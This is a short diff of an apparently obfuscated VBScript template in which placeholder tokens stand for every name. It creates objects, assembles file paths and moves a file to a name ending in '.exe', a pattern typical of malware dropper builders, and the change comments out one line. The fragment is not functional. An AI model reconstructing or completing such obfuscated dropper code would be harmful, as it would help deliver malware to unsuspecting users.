@@ -585,7 +585,7 @@ Set #var79# = CreateObject(#const59#)
 
 #var78# = #var73# + #const57#
 #var49# #var3# & #const58# & #var6#, #var69# + #var73# + #const58# + #var6#
-De#var17#F #var69# + #var73# + #const58# + #var6#,  #var69# + #var73# + #const58# + #var7# 
+'De#var17#F #var69# + #var73# + #const58# + #var6#,  #var69# + #var73# + #const58# + #var7# 
 #var31# #var69# & #var73# & #const58# & #var7#, #var69#
 Set #var34# = CreateObject(#const51#)
 #var34#.MoveFile #var69# & #var8# & #const58# , #var69# & #var78#  & ".exe"
